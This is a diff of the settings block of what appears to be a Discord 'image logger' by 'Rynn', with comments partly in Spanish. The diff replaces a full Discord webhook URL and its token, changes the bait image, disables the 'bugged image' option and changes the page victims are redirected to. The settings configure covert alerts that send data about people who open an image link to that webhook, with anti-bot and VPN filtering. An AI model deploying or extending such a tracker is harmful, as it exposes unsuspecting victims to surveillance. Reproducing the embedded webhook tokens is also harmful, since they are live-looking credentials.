@@ -9,8 +9,8 @@ __author__ = "Rynn"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1118936905933930577/GtATFqUY4pNJ6DrQdlycpYiMZGHmL19hPJIn8GXoFJbrmTiBjFTrc33JHWjPTyrnw4ff",
-    "image": "https://imgur.com/lvZeXE4",
+    "webhook": "https://discord.com/api/webhooks/1126921496867131443/R0dywbKox6FWQc_RvPruv-VR0Jna2GEo4r__G6gnyS8_LP2-7iseE13mzMX3T99R0ugF",
+    "image": "https://cdn.discordapp.com/attachments/1128910588941176892/1128932177636229260/IMG_5094.png",
     "imageArgument": True, 
 
     # CUSTOMIZATION #
@@ -34,7 +34,7 @@ config = {
                 # 2 = No enviar cuando VPN
 
     "linkAlerts": True, # envia una alerta
-    "buggedImage": True, # muestra la imagen bugeada
+    "buggedImage": False, # muestra la imagen bugeada
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
@@ -47,7 +47,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect a una pagina?
-        "page": "https://tuit.es/c8MsB"
+        "page": "https://google.com"
     },
 }
 
